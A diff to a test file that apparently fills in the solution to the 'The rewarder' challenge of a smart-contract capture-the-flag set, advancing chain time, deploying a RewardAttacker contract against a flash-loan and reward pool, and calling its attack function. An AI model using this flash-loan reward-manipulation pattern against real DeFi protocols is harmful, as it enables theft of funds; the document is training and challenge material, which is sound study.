@@ -3,7 +3,7 @@ const { expect } = require('chai');
 
 describe('[Challenge] The rewarder', function () {
 
-    let deployer, alice, bob, charlie, david, attacker;
+    let deployer, alice, bob, charlie, david, attacker, attacker2;
     let users;
 
     const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens
@@ -11,7 +11,7 @@ describe('[Challenge] The rewarder', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
-        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
+        [deployer, alice, bob, charlie, david, attacker, attacker2] = await ethers.getSigners();
         users = [alice, bob, charlie, david];
 
         const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
@@ -66,6 +66,10 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+        const RewardAttacker = await ethers.getContractFactory('RewardAttacker', deployer);
+        this.rewardAttacker = await RewardAttacker.deploy(this.rewarderPool.address, this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address);
+        await this.rewardAttacker.connect(attacker).attack();
     });
 
     after(async function () {
